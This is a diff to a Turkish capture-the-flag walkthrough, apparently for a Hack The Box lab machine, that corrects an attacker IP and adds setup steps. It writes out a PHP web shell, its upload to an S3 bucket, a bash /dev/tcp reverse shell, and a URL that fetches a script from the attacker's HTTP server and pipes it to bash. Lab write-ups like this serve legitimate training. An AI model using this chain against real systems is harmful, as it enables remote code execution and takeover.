@@ -58,11 +58,32 @@ Found: s3.thetoppers.htb Status: 404 [Size: 21]
 
     Gobuster ile elde edilen vHost bilgisini Google üzerinde aratırsak, bundan sonraki adımlarımızın [Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html) ile ilgili olacağını öğrenebiliriz.
 
+Web tarayıcısında S3 kovasına (`s3.thetoppers.htb`) erişebilmek için aşağıdaki komutu çalıştır:
+
+```bash
+echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+AWS yapılandırmasını gerçekleştir (sorulduğunda her seçenek için `temp` değerini verebilirsin):
+
+```bash
+aws configure
+```
+
+```text title="Output"
+AWS Access Key ID [None]: temp
+AWS Secret Access Key [None]: temp
+Default region name [None]: temp
+Default output format [None]: temp
+```
+
 Aşağıdaki one-liner komutunu PHP dosyası olarak kaydet:
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
+
+
 
 Oluşturulan bu dosyayı S3 kovasına (bucket) yükle:
 
@@ -70,12 +91,12 @@ Oluşturulan bu dosyayı S3 kovasına (bucket) yükle:
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
 
-Ardından aşağıdaki reverse shell payload dosyasını oluştur:
+Ardından aşağıdaki reverse shell dosyasını oluştur:
 
 ```bash title="shell.sh" linenums="1"
 #!/bin/bash
 
-bash -i >&/dev/tcp/10.129.227.248/1337 0>&1
+bash -i >&/dev/tcp/10.10.14.253/1337 0>&1
 ```
 
 Netcat ile 1337 numaralı port üzerinden dinlemeye başla:
@@ -84,13 +105,13 @@ Netcat ile 1337 numaralı port üzerinden dinlemeye başla:
 nc -nvlp 1337
 ```
 
-Reverse shell payload dosyasının bulunduğu dizinde bir Python HTTP sunucusu başlat:
+Reverse shell dosyasının bulunduğu dizinde bir Python HTTP sunucusu başlat:
 
 ```bash
 python -m http.server 8000
 ```
 
-Web tarayıcısında [https://thetoppers.htb/shell.php?cmd=curl%2010.129.227.248:8000/shell.sh|bash](https://thetoppers.htb/shell.php?cmd=curl%2010.129.227.248:8000/shell.sh|bash) adresine giderek Netcat üzerinde reverse shell elde et ve bu shell üzerinde aşağıdaki komut ile bayrağı ele geçir:
+Web tarayıcısında [https://thetoppers.htb/shell.php?cmd=curl%2010.10.14.253:8000/shell.sh|bash](https://thetoppers.htb/shell.php?cmd=curl%2010.10.14.253:8000/shell.sh|bash) adresine giderek Netcat üzerinde reverse shell elde et ve bu shell üzerinde aşağıdaki komut ile bayrağı ele geçir:
 
 ```bash
 cat /var/www/flag.txt
